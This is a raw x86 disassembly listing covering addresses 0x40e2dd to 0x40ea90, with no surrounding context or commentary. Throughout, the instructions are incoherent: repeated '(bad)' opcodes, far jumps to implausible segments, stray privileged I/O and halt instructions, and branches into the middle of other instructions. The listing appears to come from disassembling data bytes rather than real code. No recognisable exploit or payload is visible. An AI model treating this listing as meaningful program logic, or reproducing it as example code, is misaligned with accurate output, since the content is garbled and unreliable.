  40e2dd:	and    eax,0x6bd2b22c
  40e2e2:	mov    bl,0x86
  40e2e4:	aam    0x1
  40e2e6:	add    BYTE PTR [edx-0x3],ah
  40e2e9:	aad    0x2
  40e2eb:	cmp    eax,0x635c286c
  40e2f0:	add    BYTE PTR [ecx],0x57
  40e2f3:	sub    eax,0x635c290c
  40e2f8:	add    BYTE PTR [ecx],0xff
  40e2fb:	(bad)  
  40e2fc:	fcmovnbe st,st(0)
  40e2fe:	add    BYTE PTR [edx-0x27],ah
  40e301:	out    0xd2,eax
  40e303:	fcomp  DWORD PTR [ebp-0x6df36771]
  40e309:	xchg   esi,eax
  40e30a:	xor    DWORD PTR [ebx],ebp
  40e30c:	sbb    bl,dl
  40e30e:	inc    edx
  40e30f:	jno    0x40e2d9
  40e311:	ins    BYTE PTR es:[edi],dx
  40e312:	inc    esp
  40e313:	add    BYTE PTR [ecx-0x22],dh
  40e316:	mov    esp,0x7691e60d
  40e31b:	std    
  40e31c:	out    0x67,al
  40e31e:	rol    BYTE PTR [ebx],cl
  40e320:	(bad)
  40e325:	loop   0x40e2bc
  40e327:	(bad)  
  40e328:	arpl   WORD PTR [eax-0x5e9703b8],bx
  40e32e:	jmp    0x36d7:0xe814355a
  40e335:	lock jb 0x40e2b8
  40e338:	sbb    DWORD PTR [ecx],0x5e6203e9
  40e33e:	mov    ds:0x857e4627,eax
  40e343:	jns    0x40e379
  40e345:	or     DWORD PTR [ecx-0x68],esi
  40e348:	inc    ecx
  40e349:	sbb    ecx,ebp
  40e34b:	add    esp,DWORD PTR [edx+0x7e]
  40e34e:	out    0x78,al
  40e350:	sar    DWORD PTR [edi+eiz*4+0x71d96202],1
  40e357:	(bad)  
  40e358:	gs int 0x94
  40e35b:	mul    DWORD PTR [ebp-0x33]
  40e35e:	xchg   ebx,eax
  40e35f:	cld    
  40e360:	ficom  WORD PTR [ebx+ecx*1]
  40e363:	add    al,0x62
  40e365:	loopne 0x40e2fc
  40e367:	mov    esi,0xc69de062
  40e36c:	arpl   WORD PTR [edx-0x5e970438],bx
  40e372:	jmp    0xd7:0xe80ead5a
  40e379:	mov    cl,0x84
  40e37b:	add    BYTE PTR [ecx+0xc],ch
  40e37e:	xchg   ecx,eax
  40e37f:	push   esp
  40e380:	(bad)  
  40e381:	ficom  WORD PTR [eax]
  40e383:	add    ecx,ebp
  40e385:	popa   
  40e386:	fs pop ebp
  40e388:	adc    eax,0x21245c89
  40e38d:	popa   
  40e38e:	fld    DWORD PTR [eax]
  40e390:	(bad)  
  40e392:	int3   
  40e393:	inc    BYTE PTR [esi-0x3aa32c82]
  40e399:	push   ecx
  40e39a:	loopne 0x40e320
  40e39c:	ret    
  40e39d:	dec    edi
  40e39e:	(bad)  
  40e39f:	std    
  40e3a0:	pop    esp
  40e3a1:	adc    al,0xdc
  40e3a3:	xchg   DWORD PTR [ebp+0x2080bd85],esi
  40e3a9:	pop    ecx
  40e3aa:	push   es
  40e3ab:	adc    ah,dh
  40e3ad:	not    DWORD PTR ds:0xbcfd6a05
  40e3b3:	push   eax
  40e3b4:	call   0xf139bd1a
  40e3b9:	fnstsw WORD PTR [eax+edx*2-0x76269e18]
  40e3c0:	gs cmp eax,0x61e9002d
  40e3c6:	sbb    DWORD PTR [ecx+0x5128619c],eax
  40e3cc:	out    0xe4,al
  40e3ce:	add    eax,0x2761e918
  40e3d3:	(bad)  
  40e3d4:	cmp    eax,0xe9002d45
  40e3d9:	popa   
  40e3da:	nop
  40e3db:	mov    ah,0xcd
  40e3dd:	add    BYTE PTR ds:0x2ee900d9,ch
  40e3e3:	(bad)  
  40e3e4:	mov    ah,0xd
  40e3e6:	sbb    bl,cl
  40e3e8:	add    cl,ch
  40e3ea:	mov    eax,0x6735244c
  40e3ef:	fld    DWORD PTR [eax]
  40e3f1:	cmp    esi,DWORD PTR [ebp-0xfff7657]
  40e3f7:	sub    al,0xa7
  40e3f9:	mul    ah
  40e3fb:	add    eax,DWORD PTR [ebp-0x50a6fb40]
  40e401:	sbb    cl,BYTE PTR [ebx]
  40e403:	fmul   QWORD PTR [ecx-0x781fe094]
  40e409:	mov    ah,0x1f
  40e40b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e40c:	add    BYTE PTR [eax],al
  40e40e:	or     ebp,DWORD PTR ds:0xdc0b1a8c
  40e414:	or     eax,0xdd636b6
  40e419:	mov    dh,0x3e
  40e41b:	xlat   BYTE PTR ds:[ebx]
  40e41c:	mov    edi,0xc58ec3e1
  40e421:	add    esp,edx
  40e423:	push   esp
  40e424:	jl     0x40e426
  40e426:	jo     0x21bce16
  40e42c:	(bad)  
  40e42d:	inc    DWORD PTR [eax+0x59]
  40e430:	and    DWORD PTR [edx+ecx*8-0x25],ebx
  40e434:	add    BYTE PTR [ebp-0x5],al
  40e437:	stos   DWORD PTR es:[edi],eax
  40e438:	push   ebx
  40e439:	jmp    FWORD PTR [edi]
  40e43b:	mov    ecx,0xdb8b015c
  40e440:	mov    ebp,edx
  40e442:	add    BYTE PTR [ecx+ecx*2+0x21],al
  40e446:	pop    esp
  40e447:	jp     0x40e424
  40e449:	add    BYTE PTR [edi+0x64],dl
  40e44c:	dec    ecx
  40e44d:	and    DWORD PTR [edx+ecx*4-0x25],ebx
  40e451:	add    bh,bh
  40e453:	ud1    ebx,DWORD PTR [ecx+eax*1+0x7b]
  40e458:	fisttp DWORD PTR [edi-0x75]
  40e45b:	xor    BYTE PTR ds:0x454f643,ch
  40e461:	test   eax,eax
  40e463:	xor    al,0x5a
  40e465:	dec    ebx
  40e466:	sbb    bh,BYTE PTR [ebx]
  40e468:	fisttp DWORD PTR ds:0xdd476b6
  40e46e:	mov    dh,0x62
  40e470:	mov    ebp,0x7943c106
  40e475:	inc    bh
  40e477:	popa   
  40e478:	test   eax,0xe4627c81
  40e47d:	lock jmp 0xb615:0xfe67bb0b
  40e485:	jnp    0x40e4f2
  40e487:	inc    esi
  40e488:	aam    0x7d
  40e48a:	aam    0x55
  40e48c:	es mov esp,0xc42e6d00
  40e492:	add    DWORD PTR [ebx],esp
  40e494:	(bad)  
  40e495:	stc    
  40e496:	or     bl,BYTE PTR [edx]
  40e498:	test   BYTE PTR [edi+edi*2+0x28],dl
  40e49c:	in     al,0xf0
  40e49e:	jmp    0x40e489
  40e4a0:	cld    
  40e4a1:	sbb    eax,0x180635c
  40e4a6:	inc    eax
  40e4a7:	add    BYTE PTR [edx],dh
  40e4a9:	dec    esi
  40e4aa:	push   0xffffffb3
  40e4ac:	jle    0x40e4fa
  40e4ae:	add    al,0x0
  40e4b0:	bound  eax,QWORD PTR [ebx]
  40e4b2:	inc    esp
  40e4b3:	add    dh,BYTE PTR [ebp+0x635c1d64]
  40e4b9:	add    BYTE PTR [ecx],0x8b
  40e4bc:	cdq    
  40e4bd:	addr16 push 0xffffffb3
  40e4c0:	inc    esi
  40e4c1:	fs add al,0x0
  40e4c4:	bound  edi,QWORD PTR [edi-0x7ed1dc53]
  40e4ca:	add    DWORD PTR [eax],eax
  40e4cc:	test   DWORD PTR [esi+ebx*1],esp
  40e4cf:	pop    esp
  40e4d0:	arpl   WORD PTR [eax-0x1a5b17ff],ax
  40e4d6:	push   0xfffffffe
  40e4d8:	out    0xc0,eax
  40e4da:	cli    
  40e4db:	test   BYTE PTR [ebx+0x4b000179],cl
  40e4e1:	dec    eax
  40e4e2:	outs   dx,DWORD PTR ds:[esi]
  40e4e3:	(bad)  
  40e4e4:	push   ebp
  40e4e5:	xor    eax,0xd99fb5fa
  40e4ea:	call   0xea54f4e7
  40e4ef:	inc    edx
  40e4f0:	inc    edx
  40e4f1:	loope  0x40e4d5
  40e4f3:	cmp    esp,DWORD PTR [eax-0x80]
  40e4f6:	addr16 out 0x2d,eax
  40e4f9:	sub    bh,BYTE PTR [ebx*2+0x69bb9e3a]
  40e500:	sbb    al,0xde
  40e502:	jge    0x40e4bb
  40e504:	(bad)  
  40e505:	fidiv  WORD PTR [ebp-0x41]
  40e508:	arpl   WORD PTR [eax+0x5800fc88],bx
  40e50e:	mov    eax,ds:0xa8484f72
  40e513:	pusha  
  40e514:	rol    BYTE PTR [ecx-0x17],1
  40e517:	popa   
  40e518:	push   es
  40e519:	cs clc 
  40e51b:	stc    
  40e51c:	and    ebx,ecx
  40e51e:	pop    esp
  40e51f:	ret    
  40e520:	iret   
  40e521:	(bad)  
  40e522:	(bad)  
  40e524:	jl     0x40e550
  40e526:	aad    0x60
  40e528:	mov    eax,0x7872b581
  40e52d:	and    DWORD PTR ds:0x626203e9,0xb4e97ae0
  40e537:	mov    bl,0x2
  40e539:	(bad)  
  40e53a:	fst    DWORD PTR [edx+0x0]
  40e53d:	fild   DWORD PTR [esp+eax*1]
  40e540:	and    BYTE PTR [esi+0x31],bl
  40e543:	out    0x7f,eax
  40e545:	dec    esi
  40e546:	repz out 0x3,eax
  40e549:	dec    esi
  40e54a:	xor    bh,dh
  40e54c:	jg     0x40e584
  40e54e:	repz out 0x3,eax
  40e551:	ds xor esp,edi
  40e554:	jg     0x40e594
  40e556:	repz out 0x3,eax
  40e559:	cs xor dh,bh
  40e55c:	jg     0x40e5a4
  40e55e:	repz out 0x3,eax
  40e561:	sahf   
  40e562:	cs add esi,esp
  40e565:	aad    0xe5
  40e567:	sbb    ch,cl
  40e569:	popa   
  40e56a:	int    0x5d
  40e56c:	pop    ebp
  40e56d:	inc    esi
  40e56e:	shl    DWORD PTR [edx-0x12],1
  40e571:	add    BYTE PTR [ebx+eax*2-0x239e1700],bh
  40e578:	mov    dh,0x3b
  40e57a:	addr16 pusha 
  40e57c:	inc    esp
  40e57d:	or     eax,0xf1e29a4e
  40e582:	sbb    al,BYTE PTR [edi+0x40]
  40e585:	in     eax,dx
  40e586:	push   ss
  40e587:	popf   
  40e588:	xchg   DWORD PTR [esi-0x73],edx
  40e58b:	mov    ebp,?
  40e58d:	jmp    0xe253be1e
  40e592:	and    ch,cl
  40e594:	jl     0x40e577
  40e596:	cs cdq 
  40e598:	inc    eax
  40e599:	pusha  
  40e59a:	and    al,ch
  40e59c:	jmp    0x11544c60
  40e5a1:	jb     0x40e5bd
  40e5a3:	loope  0x40e5ce
  40e5a5:	stos   DWORD PTR es:[edi],eax
  40e5a6:	dec    esp
  40e5a7:	enter  0x6212,0xcd
  40e5ab:	pop    ecx
  40e5ac:	xchg   ebp,ebp
  40e5ae:	adc    BYTE PTR [eax+0x45],ah
  40e5b1:	in     eax,dx
  40e5b2:	ds lahf 
  40e5b4:	sub    DWORD PTR [esi+0x60010299],esp
  40e5ba:	cmc    
  40e5bb:	cmp    al,0x4
  40e5bd:	je     0x40e564
  40e5bf:	jmp    0xe848:0xb8e2005e
  40e5c6:	popa   
  40e5c7:	fnstcw WORD PTR [ebp-0x1d]
  40e5ca:	out    0x4c,al
  40e5cc:	add    dh,BYTE PTR [eax+0x5]
  40e5cf:	mov    eax,0xd961e848
  40e5d4:	mov    DWORD PTR [esi+0x0],esp
  40e5d7:	in     eax,0x8c
  40e5d9:	std    
  40e5da:	jmp    0x6605c7
  40e5df:	xchg   DWORD PTR [ebx],ecx
  40e5e1:	leave  
  40e5e2:	je     0x40e5f7
  40e5e4:	mov    edi,0x95d6044f
  40e5e9:	mov    al,BYTE PTR [ecx]
  40e5eb:	ret    0x9159
  40e5ee:	add    BYTE PTR [ebx],bh
  40e5f0:	fmul   DWORD PTR [ecx-0x21eac4bf]
  40e5f6:	add    bh,BYTE PTR [ebx-0xc]
  40e5f9:	jo     0x40e607
  40e5fb:	sbb    al,0x7c
  40e5fd:	or     edi,edi
  40e5ff:	push   es
  40e600:	xchg   esp,eax
  40e601:	adc    eax,DWORD PTR [eax+0xb]
  40e604:	punpckhdq mm4,QWORD PTR [ebx+ebp*2]
  40e608:	pop    eax
  40e609:	ror    DWORD PTR [eax+eax*4],0x9a
  40e60d:	adc    DWORD PTR [ebx-0x7b777292],ecx
  40e613:	daa    
  40e614:	push   eax
  40e615:	add    BYTE PTR [eax],al
  40e617:	or     ecx,DWORD PTR [edi]
  40e619:	inc    edx
  40e61a:	and    al,0x13
  40e61c:	or     eax,0xcff246a
  40e621:	and    BYTE PTR [ebx+edi*2],0xd6
  40e625:	add    BYTE PTR [eax],al
  40e627:	loop   0x40e624
  40e629:	icebp  
  40e62a:	(bad)  
  40e62b:	cmp    al,0x10
  40e62d:	push   edx
  40e62e:	and    al,0xcb
  40e630:	push   edi
  40e631:	jl     0x40e633
  40e633:	test   BYTE PTR [esi],0x42
  40e636:	and    al,0x53
  40e638:	push   cs
  40e639:	and    BYTE PTR [eax+eax*1],0xeb
  40e63d:	aam    0x0
  40e63f:	add    BYTE PTR [ebx+ecx*1-0xba30472],ch
  40e646:	cmp    bl,BYTE PTR [edi+eiz*2-0x47]
  40e64a:	or     eax,0xff000584
  40e64f:	(bad)  
  40e650:	sti    
  40e651:	mov    esi,0xde896a5f
  40e656:	mov    DWORD PTR [ebx+0x5766e162],0x8379ba61
  40e660:	ds ss add al,0x0
  40e664:	bound  eax,QWORD PTR [eax-0x7f]
  40e667:	jl     0x40e6cb
  40e669:	imul   edi,DWORD PTR [ebx+ecx*4-0x7a],0x68
  40e66e:	add    al,0x0
  40e670:	(bad)  
  40e671:	shl    ch,1
  40e673:	test   BYTE PTR [eax-0x7d],bl
  40e676:	add    DWORD PTR [eax],eax
  40e678:	mov    WORD PTR [ebx-0x7e71dc53],fs
  40e67e:	add    DWORD PTR [eax],eax
  40e680:	xlat   BYTE PTR ds:[ebx]
  40e681:	in     eax,dx
  40e682:	add    edi,edi
  40e684:	xchg   esi,eax
  40e685:	aam    0xc0
  40e687:	mov    ch,BYTE PTR [ecx]
  40e689:	in     al,dx
  40e68a:	gs mov bl,0x46
  40e68d:	fadd   QWORD PTR [ebx]
  40e68f:	add    BYTE PTR [edx+0x33],ah
  40e692:	lods   eax,DWORD PTR ds:[esi]
  40e693:	and    ebx,DWORD PTR [esi-0xafffe7f]
  40e699:	sub    al,0x1e
  40e69b:	pop    esp
  40e69c:	arpl   WORD PTR [eax+0x5800e801],ax
  40e6a2:	or     al,0x67
  40e6a4:	(bad)  
  40e6a5:	out    0x40,eax
  40e6a7:	test   BYTE PTR [edi+ebp*2-0x26fffe58],0x24
  40e6af:	push   ds
  40e6b0:	pop    eax
  40e6b1:	arpl   WORD PTR [eax+0x7b908501],ax
  40e6b7:	sub    BYTE PTR [edx-0x74fe7fa6],0x3e
  40e6be:	aam    0x14
  40e6c0:	jmp    0x429280
  40e6c5:	pop    ebx
  40e6c6:	inc    ebx
  40e6c7:	and    eax,0xc6876b74
  40e6cc:	addr16 pop ebp
  40e6ce:	hlt    
  40e6cf:	adc    DWORD PTR [eax],esp
  40e6d1:	(bad)  
  40e6d2:	(bad)  
  40e6d4:	ins    DWORD PTR es:[edi],dx
  40e6d5:	loope  0x40e68c
  40e6d7:	mov    bh,0x4
  40e6d9:	(bad)  
  40e6da:	fldl2t 
  40e6dc:	out    dx,eax
  40e6dd:	stc    
  40e6de:	pop    ebp
  40e6df:	sahf   
  40e6e0:	fld    TBYTE PTR [eax]
  40e6e2:	mov    al,0x7b
  40e6e4:	(bad)  
  40e6e5:	cwde   
  40e6e6:	sub    cl,BYTE PTR [esi+esi*8+0x3d682e1]
  40e6ed:	bound  ebx,QWORD PTR [esi-0x6a]
  40e6f0:	or     ebx,edi
  40e6f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6f3:	pop    ebx
  40e6f4:	add    eax,0x7deeb079
  40e6f9:	cmp    al,0xea
  40e6fb:	out    0x3,eax
  40e6fd:	xchg   esp,eax
  40e6fe:	pop    esp
  40e6ff:	or     BYTE PTR es:[edx+0x397328],dl
  40e706:	add    eax,0x620327ee
  40e70b:	push   esp
  40e70c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e70d:	cmc    
  40e70e:	loope  0x40e6b6
  40e710:	into   
  40e711:	add    esp,DWORD PTR [edx+0x7e]
  40e714:	xlat   BYTE PTR ds:[ebx]
  40e715:	js     0x40e6ab
  40e717:	in     eax,dx
  40e718:	ins    BYTE PTR es:[edi],dx
  40e719:	add    BYTE PTR [ebx-0x32],dl
  40e71c:	scas   eax,DWORD PTR es:[edi]
  40e71d:	cmc    
  40e71e:	jecxz  0x40e6b6
  40e720:	out    dx,al
  40e721:	add    esp,DWORD PTR [edx+0x5e]
  40e724:	mov    dl,0x19
  40e726:	test   al,0x5e
  40e728:	call   0xe6fe0456
  40e72d:	jle    0x40e73f
  40e72f:	jmp    0x28a7:0x999103e7
  40e736:	xchg   edx,eax
  40e737:	add    al,0xec
  40e739:	jns    0x40e75d
  40e73b:	fcom   DWORD PTR [ecx]
  40e73d:	mov    ebp,0xa464da7e
  40e742:	inc    esp
  40e743:	(bad)  
  40e745:	mov    esi,0x6541668a
  40e74a:	xchg   esp,eax
  40e74b:	int    0x0
  40e74d:	xchg   esi,eax
  40e74e:	test   eax,0x5f5883da
  40e753:	fld    DWORD PTR [eax]
  40e755:	lods   al,BYTE PTR ds:[esi]
  40e756:	sbb    ch,bl
  40e758:	neg    DWORD PTR [esi]
  40e75a:	call   FWORD PTR [esi-0x7b]
  40e75d:	popa   
  40e75e:	data16 fld DWORD PTR [eax]
  40e761:	jmp    0x7fbb:0x2139f1a6
  40e768:	mov    DWORD PTR [edx],esi
  40e76a:	add    cl,bl
  40e76c:	push   esp
  40e76d:	and    al,0xa9
  40e76f:	pusha  
  40e770:	fld    DWORD PTR [eax]
  40e772:	add    al,al
  40e774:	mov    es,WORD PTR [ebp+ecx*1-0x16ff25ea]
  40e77b:	arpl   WORD PTR ds:0xf4f6624f,cx
  40e781:	cmp    DWORD PTR [eax+0x1e89c832],esi
  40e787:	outs   dx,BYTE PTR ds:[esi]
  40e788:	pop    esi
  40e789:	shl    BYTE PTR ds:0x2e8c2f70,cl
  40e78f:	pop    edx
  40e790:	sub    DWORD PTR [eax+0x62],edx
  40e793:	dec    edx
  40e794:	xor    bl,0xe7
  40e797:	pusha  
  40e798:	(bad)  
  40e79a:	push   cs
  40e79b:	jg     0x40e724
  40e79d:	std    
  40e79e:	ret    0xe4b6
  40e7a1:	cmp    DWORD PTR [eax-0x19c1a012],esi
  40e7a7:	popa   
  40e7a8:	(bad)  [edx+0x2d208bea]
  40e7ae:	out    0x4c,al
  40e7b0:	retf   
  40e7b1:	sbb    eax,0xc0cc61e9
  40e7b6:	test   eax,0xd51d2088
  40e7bb:	cmp    dl,BYTE PTR [edx+0x41]
  40e7be:	call   0x4f3ee9cb
  40e7c3:	shl    DWORD PTR ds:[ebp+0x0],0xcb
  40e7c8:	and    esi,DWORD PTR [ebp-0x1]
  40e7cb:	push   esp
  40e7cc:	std    
  40e7cd:	cmp    BYTE PTR [edi+0x0],dh
  40e7d0:	mov    ebx,0x9412848d
  40e7d5:	fadd   QWORD PTR [eax]
  40e7d7:	cmp    esp,ebx
  40e7d9:	lods   al,BYTE PTR ds:[esi]
  40e7da:	je     0x40e847
  40e7dc:	lock inc esp
  40e7de:	imul   edi,DWORD PTR [ebx],0x62818d33
  40e7e4:	push   esp
  40e7e5:	std    
  40e7e6:	dec    BYTE PTR [ebx-0x2d7c2c04]
  40e7ec:	iret   
  40e7ed:	mov    edx,0x5944d839
  40e7f2:	repnz push ds
  40e7f4:	cmp    ebx,esp
  40e7f6:	push   esi
  40e7f7:	lea    esi,[ecx+ebx*8+0x4f]
  40e7fb:	push   eax
  40e7fc:	mov    al,0x18
  40e7fe:	out    0x8d,al
  40e800:	push   ebp
  40e801:	fiadd  WORD PTR [eax]
  40e803:	test   ebx,edi
  40e805:	jmp    0x40e78b
  40e807:	fiadd  WORD PTR ds:0x448d00dc
  40e80d:	fldl2t 
  40e80f:	sub    eax,DWORD PTR [esi-0x5d4e654]
  40e815:	out    0xd8,al
  40e817:	jl     0xb410446
  40e81d:	push   esi
  40e81e:	add    bh,BYTE PTR [edx]
  40e820:	cmp    al,0xc9
  40e822:	or     eax,0xdaba85
  40e827:	add    BYTE PTR [eax],bl
  40e829:	sbb    al,0x3e
  40e82b:	cmp    edx,ecx
  40e82d:	scas   eax,DWORD PTR es:[edi]
  40e82e:	or     DWORD PTR [edx+0x473ade78],ecx
  40e834:	add    BYTE PTR [esi],al
  40e836:	jmp    0x40e7bb
  40e838:	scas   al,BYTE PTR es:[edi]
  40e839:	fld    QWORD PTR gs:[eax]
  40e83c:	mov    edi,esp
  40e83e:	ja     0x40e86a
  40e840:	add    DWORD PTR [edx-0x15],esp
  40e843:	cmp    al,0xe8
  40e845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e846:	pop    ss
  40e847:	(bad)  
  40e848:	(bad)  
  40e849:	pop    ecx
  40e84a:	aas    
  40e84b:	in     eax,dx
  40e84c:	push   cs
  40e84d:	loopne 0x40e847
  40e84f:	add    al,BYTE PTR [eax]
  40e851:	bound  ebx,QWORD PTR [ecx]
  40e853:	push   es
  40e854:	inc    DWORD PTR [ebp+0xe468db6]
  40e85a:	jnp    0x40e895
  40e85c:	push   cs
  40e85d:	fsubp  st(0),st
  40e85f:	(bad)  
  40e860:	(bad)  
  40e861:	ins    DWORD PTR es:[edi],dx
  40e862:	cli    
  40e863:	mov    ecx,0xd8c3df17
  40e868:	and    DWORD PTR [ecx-0x327cee48],ebx
  40e86e:	xchg   ecx,eax
  40e86f:	add    DWORD PTR [eax],eax
  40e871:	mov    ah,0xfd
  40e873:	rcr    DWORD PTR [ebx],1
  40e875:	mov    bl,0x60
  40e877:	mov    cs,edx
  40e879:	dec    edx
  40e87a:	test   DWORD PTR [edi],ebx
  40e87c:	add    DWORD PTR [edx-0x3],esp
  40e87f:	inc    ecx
  40e880:	push   cs
  40e881:	out    0x12,al
  40e883:	and    al,0x0
  40e885:	bound  esp,QWORD PTR ds:0xec091bd3
  40e88b:	(bad)  
  40e88c:	dec    esi
  40e88d:	jbe    0x40e87a
  40e88f:	add    edi,DWORD PTR [ebx]
  40e891:	sub    al,BYTE PTR [eax+0x70434f8a]
  40e897:	add    DWORD PTR [edx-0x35859f00],ecx
  40e89d:	sub    esp,DWORD PTR [ebp-0x3]
  40e8a0:	enter  0x6220,0x70
  40e8a4:	push   ss
  40e8a5:	shl    BYTE PTR [edx+0x6e7404a9],0xa
  40e8ac:	mov    DWORD PTR [eax],0xf2fbf98
  40e8b2:	out    0x42,eax
  40e8b4:	and    al,0x0
  40e8b6:	(bad)  
  40e8b7:	sti    
  40e8b8:	retf   0x896b
  40e8bb:	fld1   
  40e8bd:	push   ds
  40e8be:	call   0xe7d9:0x832864d6
  40e8c5:	ins    BYTE PTR es:[edi],dx
  40e8c6:	loopne 0x40e84f
  40e8c8:	dec    esi
  40e8c9:	bound  ebx,QWORD PTR [eax+0x26]
  40e8cc:	rcr    al,1
  40e8ce:	pop    esp
  40e8cf:	retf   0x8e27
  40e8d2:	mov    bh,0x19
  40e8d4:	inc    ebx
  40e8d5:	add    DWORD PTR [ecx+0x26],ecx
  40e8d8:	mov    al,0xda
  40e8da:	addr16 push esp
  40e8dc:	stos   BYTE PTR es:[edi],al
  40e8dd:	(bad)  
  40e8de:	jmp    0x1712:0xb412a01e
  40e8e5:	mov    ds,WORD PTR [ecx*8-0x278e6622]
  40e8ec:	mov    edx,0xe3732243
  40e8f1:	ret    
  40e8f2:	sub    BYTE PTR [ecx+0xbb9c2b2],0xcf
  40e8f9:	xchg   BYTE PTR [ebp+eax*1+0x4e00d7e8],bh
  40e900:	ret    0x287b
  40e903:	mov    ds:0xac03e7d8,al
  40e908:	aad    0x60
  40e90a:	leave  
  40e90b:	mov    ecx,0x64e02ec0
  40e910:	push   esi
  40e911:	push   ebx
  40e912:	add    al,0x62
  40e914:	fldenv [edx+0x52]
  40e917:	clc    
  40e918:	jmp    0x182e:0x526899de
  40e91f:	gs dec edi
  40e921:	jmp    0x40e92e
  40e923:	xor    DWORD PTR [ecx+0x19616ba8],ebx
  40e929:	retf   
  40e92a:	dec    ebx
  40e92b:	jmp    0x40e948
  40e92d:	call   0xc435d3f8
  40e932:	dec    DWORD PTR [ecx+0x58fc00dc]
  40e938:	retf   0xb2c0
  40e93b:	das    
  40e93c:	xlat   BYTE PTR ds:[ebx]
  40e93d:	xchg   esp,eax
  40e93e:	sub    DWORD PTR [edi-0x21],eax
  40e941:	xor    DWORD PTR [ecx],ebp
  40e943:	dec    edi
  40e944:	xchg   ebx,eax
  40e945:	or     eax,0xc05d1e7c
  40e94a:	fsubrp st(4),st
  40e94c:	popa   
  40e94d:	and    cl,ch
  40e94f:	popa   
  40e950:	jo     0x40e92d
  40e952:	cmp    BYTE PTR [ebx],al
  40e954:	xchg   DWORD PTR [ecx-0x2da37662],ecx
  40e95a:	mov    ch,0xbb
  40e95c:	ret    0x955d
  40e95f:	mov    gs,esi
  40e961:	push   esi
  40e962:	ins    BYTE PTR es:[edi],dx
  40e963:	add    BYTE PTR [ebx-0x74e9af1f],bl
  40e969:	icebp  
  40e96a:	mov    DWORD PTR [edx],esp
  40e96c:	into   
  40e96d:	mov    esi,0x5e61e83b
  40e972:	shr    dh,0xe4
  40e975:	or     BYTE PTR [ecx],ah
  40e977:	jmp    0xa908b1dd
  40e97c:	out    dx,al
  40e97d:	xchg   edi,eax
  40e97e:	inc    ecx
  40e97f:	and    ch,BYTE PTR [ebx]
  40e981:	icebp  
  40e982:	or     eax,0xfd85996b
  40e987:	(bad)  
  40e988:	fiadd  WORD PTR [ebx]
  40e98a:	jge    0x40e975
  40e98c:	jb     0x40e9eb
  40e98e:	pop    ecx
  40e98f:	or     DWORD PTR [esi-0x27],ebx
  40e992:	cmp    DWORD PTR [ebp+0x45],ebx
  40e995:	sbb    DWORD PTR [eax],eax
  40e997:	jmp    0x1fc7bdfd
  40e99c:	inc    esi
  40e99d:	fld    DWORD PTR [eax]
  40e99f:	loopne 0x40e9b3
  40e9a1:	add    DWORD PTR [eax-0x712bddd2],ecx
  40e9a7:	sub    edi,DWORD PTR [esi]
  40e9a9:	fld    DWORD PTR [eax]
  40e9ab:	add    edi,DWORD PTR [edx]
  40e9ad:	es call 0xf98ab3
  40e9b3:	add    BYTE PTR [eax-0x6f],dl
  40e9b6:	imul   ebp,DWORD PTR [ebx],0xd839d974
  40e9bc:	mov    ah,0x64
  40e9be:	xchg   DWORD PTR [ebx],eax
  40e9c0:	pop    eax
  40e9c1:	adc    BYTE PTR [ecx+0x3a],al
  40e9c4:	add    al,0xb5
  40e9c6:	jae    0x40e97d
  40e9c8:	add    BYTE PTR [edx-0x56],dl
  40e9cb:	sbb    DWORD PTR [edi],ecx
  40e9cd:	pop    es
  40e9ce:	sbb    DWORD PTR ds:0x42568b00,0x1
  40e9d5:	popa   
  40e9d6:	xchg   edx,eax
  40e9d7:	sub    al,0xf
  40e9d9:	test   DWORD PTR [esi-0xa74ffe3],0x9d488b9b
  40e9e3:	cmp    al,BYTE PTR [edi-0x21]
  40e9e6:	jmp    0xf98f5f6d
  40e9eb:	inc    BYTE PTR [ebx+0xefda3ec]
  40e9f1:	(bad)  
  40e9f2:	pop    ds
  40e9f3:	pop    ds
  40e9f4:	add    BYTE PTR [ebx],bh
  40e9f6:	in     eax,0xd7
  40e9f8:	lgs    esp,FWORD PTR [edi]
  40e9fb:	pop    ds
  40e9fc:	add    BYTE PTR [ebx-0x13],cl
  40e9ff:	rol    BYTE PTR [eax-0x7e],0x9c
  40ea03:	jns    0x40e98e
  40ea05:	test   BYTE PTR [ecx+0x44509eea],bl
  40ea0b:	imul   esi,DWORD PTR [ebx-0x33],0x900bb6d3
  40ea12:	pushf  
  40ea13:	xor    DWORD PTR [ebx-0x2b],eax
  40ea16:	sar    bh,1
  40ea18:	add    esp,DWORD PTR [edx]
  40ea1a:	cmp    edi,ebx
  40ea1c:	dec    esp
  40ea1e:	fistp  WORD PTR [ebp+0x6c]
  40ea21:	pop    eax
  40ea22:	push   ss
  40ea23:	movzx  esi,al
  40ea26:	dec    esi
  40ea27:	inc    esi
  40ea28:	xor    al,0x62
  40ea2a:	scas   eax,DWORD PTR es:[edi]
  40ea2b:	push   esi
  40ea2c:	add    eax,DWORD PTR [eax]
  40ea2e:	arpl   WORD PTR [esi+0xe],di
  40ea31:	test   BYTE PTR [ecx],bl
  40ea33:	jnp    0x40ea36
  40ea35:	add    BYTE PTR [ebx-0x3a019f88],bh
  40ea3b:	inc    esi
  40ea3c:	mov    esi,0xdc4316b
  40ea41:	mov    dh,0x69
  40ea43:	pop    es
  40ea44:	(bad)  
  40ea45:	xor    esi,DWORD PTR [ecx-0x40]
  40ea48:	ret    0xde42
  40ea4b:	test   DWORD PTR [ecx+ebp*8],eax
  40ea4e:	push   ss
  40ea4f:	adc    al,0x5e
  40ea51:	(bad)  
  40ea52:	pop    ecx
  40ea53:	cmp    ebp,ebp
  40ea55:	jb     0x40ea4c
  40ea57:	jb     0x40e9ec
  40ea59:	or     bl,cl
  40ea5b:	xor    dl,BYTE PTR ds:0xc22f9033
  40ea61:	or     DWORD PTR [esi+0x71],0x6a
  40ea65:	leave  
  40ea66:	sub    DWORD PTR [ebx-0x13],eax
  40ea69:	jb     0x40ea4c
  40ea6b:	jp     0x40ea00
  40ea6d:	or     ch,cl
  40ea6f:	cmp    edx,DWORD PTR ds:0x4754c43
  40ea75:	adc    BYTE PTR [ebx],bh
  40ea77:	dec    eax
  40ea78:	pop    ebx
  40ea79:	inc    BYTE PTR [ebp+0x48]
  40ea7c:	mov    esi,0xeaef6d6b
  40ea81:	(bad)  
  40ea82:	xor    eax,0x59b60e7c
  40ea87:	pop    es
  40ea88:	(bad)  
  40ea89:	xor    esp,DWORD PTR [ecx+0x720105a2]
  40ea8f:	xchg   edi,eax
  40ea90:	jle    0x40eacc
